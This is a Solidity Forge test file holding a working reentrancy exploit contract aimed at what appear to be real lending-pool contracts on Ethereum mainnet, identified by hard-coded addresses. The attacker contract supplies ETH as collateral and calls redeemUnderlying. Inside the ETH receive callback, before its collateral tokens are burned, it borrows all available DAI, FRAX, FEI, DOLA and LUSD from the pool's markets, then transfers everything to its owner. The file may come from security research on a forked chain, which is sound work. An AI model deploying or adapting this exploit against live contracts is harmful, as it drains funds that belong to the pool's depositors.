// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
    function exitMarket(address) external returns (uint256);
    function getAccountLiquidity(address) external view returns (uint256, uint256, uint256);
    function borrowGuardianPaused(address) external view returns (bool);
    function mintGuardianPaused(address) external view returns (bool);
    function markets(address) external view returns (bool, uint256);
}

interface ICEther {
    function mint() external payable;
    function redeem(uint256) external returns (uint256);
    function redeemUnderlying(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
}

interface ICErc20 {
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function underlying() external view returns (address);
}

contract Pool6RedeemAttacker {
    address constant COMPTROLLER = 0x814b02C1ebc9164972D888495927fe1697F0Fb4c;
    address constant F6_ETH = 0xF6551C22276b9Bf62FaD09f6bD6Cad0264b89789;

    // Unpaused CErc20 markets in Pool 6
    address constant F_DAI_6 = 0x989273ec41274C4227bCB878C2c26fdd3afbE70d;
    address constant F_FRAX_6 = 0x1531C1a63A169aC75A2dAAe399080745fa51dE44;
    address constant F_FEI_6 = 0x185Ab80A77D362447415a5B347D7CD86ecaCC87C;
    address constant F_DOLA_6 = 0xf65155C9595F99BFC193CaFF0AAb6e2a98cf68aE;
    address constant F_LUSD_6 = 0x4e457722B68F8adC887F5De85b8410021Bd698AC;

    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address constant FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    address constant DOLA = 0x865377367054516e17014CcdED1e7d814EDC9ce4;
    address constant LUSD = 0x5f98805A4E8be255a32880FDeC7F6728C6568bA0;

    address payable public immutable owner;
    bool public inRedeem;
    uint256 public redeemAmount;
    uint256 public ethSupplied;

    constructor() {
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.sender == owner, "not owner");
        ethSupplied = msg.value;

        console.log("=== Pool 6 Redeem Reentrancy Attack ===");
        console.log("ETH supplied:", ethSupplied / 1e18);

        // Step 1: Supply ETH to fETH-6
        ICEther(F6_ETH).mint{value: ethSupplied}();
        uint256 cBalance = ICEther(F6_ETH).balanceOf(address(this));
        console.log("fETH-6 cTokens:", cBalance);

        // Step 2: Enter fETH market as collateral
        address[] memory markets = new address[](1);
        markets[0] = F6_ETH;
        uint256[] memory results = IComptroller(COMPTROLLER).enterMarkets(markets);
        require(results[0] == 0, "enterMarkets failed");

        // Step 3: Check liquidity before redeem
        (uint256 err, uint256 liq, uint256 sf) = IComptroller(COMPTROLLER).getAccountLiquidity(address(this));
        console.log("Pre-redeem liquidity:", liq / 1e18);
        console.log("Pre-redeem shortfall:", sf / 1e18);

        // Step 4: Redeem most of our ETH to trigger callback
        // We keep a tiny bit to ensure redeemTokens > 0
        redeemAmount = ethSupplied - 1 ether; // redeem all but 1 ETH
        inRedeem = true;

        console.log("Calling redeemUnderlying for:", redeemAmount / 1e18, "ETH");
        uint256 redeemResult = ICEther(F6_ETH).redeemUnderlying(redeemAmount);
        inRedeem = false;

        console.log("Redeem result:", redeemResult);

        // Check what we got
        console.log("DAI balance:", IERC20(DAI).balanceOf(address(this)) / 1e18);
        console.log("FRAX balance:", IERC20(FRAX).balanceOf(address(this)) / 1e18);
        console.log("FEI balance:", IERC20(FEI).balanceOf(address(this)) / 1e18);
        console.log("DOLA balance:", IERC20(DOLA).balanceOf(address(this)) / 1e18);
        console.log("ETH balance:", address(this).balance / 1e18);

        // Transfer everything to owner
        _sendAll();
    }

    receive() external payable {
        if (!inRedeem || msg.sender != F6_ETH) return;

        console.log("=== REENTRANCY CALLBACK ===");
        console.log("ETH received in callback:", msg.value / 1e18);

        // Check liquidity - our cTokens haven't been burned yet!
        (uint256 err, uint256 liq, uint256 sf) = IComptroller(COMPTROLLER).getAccountLiquidity(address(this));
        console.log("In-callback liquidity:", liq / 1e18);
        console.log("In-callback shortfall:", sf / 1e18);
        console.log("fETH balance in callback:", ICEther(F6_ETH).balanceOf(address(this)));

        // Try borrowing stablecoins during the callback
        // Our cToken balance is still full, so we should have borrowing power

        // Try DAI first
        uint256 daiCash = ICErc20(F_DAI_6).getCash();
        console.log("DAI cash available:", daiCash / 1e18);
        if (daiCash > 0) {
            uint256 borrowResult = ICErc20(F_DAI_6).borrow(daiCash);
            console.log("DAI borrow result:", borrowResult);
        }

        // Try FRAX
        uint256 fraxCash = ICErc20(F_FRAX_6).getCash();
        console.log("FRAX cash available:", fraxCash / 1e18);
        if (fraxCash > 1e18) {
            uint256 borrowResult = ICErc20(F_FRAX_6).borrow(fraxCash);
            console.log("FRAX borrow result:", borrowResult);
        }

        // Try FEI
        uint256 feiCash = ICErc20(F_FEI_6).getCash();
        console.log("FEI cash available:", feiCash / 1e18);
        if (feiCash > 1e18) {
            uint256 borrowResult = ICErc20(F_FEI_6).borrow(feiCash);
            console.log("FEI borrow result:", borrowResult);
        }

        // Try DOLA
        uint256 dolaCash = ICErc20(F_DOLA_6).getCash();
        console.log("DOLA cash available:", dolaCash / 1e18);
        if (dolaCash > 1e18) {
            uint256 borrowResult = ICErc20(F_DOLA_6).borrow(dolaCash);
            console.log("DOLA borrow result:", borrowResult);
        }

        // Try LUSD
        uint256 lusdCash = ICErc20(F_LUSD_6).getCash();
        console.log("LUSD cash available:", lusdCash / 1e18);
        if (lusdCash > 1e18) {
            uint256 borrowResult = ICErc20(F_LUSD_6).borrow(lusdCash);
            console.log("LUSD borrow result:", borrowResult);
        }

        console.log("=== END CALLBACK ===");
    }

    function _sendAll() internal {
        // Send ERC20s
        uint256 daiBal = IERC20(DAI).balanceOf(address(this));
        if (daiBal > 0) IERC20(DAI).transfer(owner, daiBal);
        uint256 fraxBal = IERC20(FRAX).balanceOf(address(this));
        if (fraxBal > 0) IERC20(FRAX).transfer(owner, fraxBal);
        uint256 feiBal = IERC20(FEI).balanceOf(address(this));
        if (feiBal > 0) IERC20(FEI).transfer(owner, feiBal);
        uint256 dolaBal = IERC20(DOLA).balanceOf(address(this));
        if (dolaBal > 0) IERC20(DOLA).transfer(owner, dolaBal);
        uint256 lusdBal = IERC20(LUSD).balanceOf(address(this));
        if (lusdBal > 0) IERC20(LUSD).transfer(owner, lusdBal);
        // Send ETH
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) {
            (bool ok,) = owner.call{value: ethBal}("");
            require(ok);
        }
    }
}

contract Pool6RedeemReentrancyTest is Test {
    function test_pool6_redeem_reentrancy() external {
        // Give ourselves some ETH
        vm.deal(address(this), 1100 ether);

        Pool6RedeemAttacker attacker = new Pool6RedeemAttacker();

        uint256 ethBefore = address(this).balance;
        console.log("ETH before:", ethBefore / 1e18);

        attacker.attack{value: 1000 ether}();

        uint256 ethAfter = address(this).balance;
        console.log("ETH after:", ethAfter / 1e18);
        console.log("DAI held:", IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F).balanceOf(address(this)) / 1e18);
        console.log("FRAX held:", IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e).balanceOf(address(this)) / 1e18);
        console.log("FEI held:", IERC20(0x956F47F50A910163D8BF957Cf5846D573E7f87CA).balanceOf(address(this)) / 1e18);
        console.log("DOLA held:", IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4).balanceOf(address(this)) / 1e18);
    }

    receive() external payable {}
}
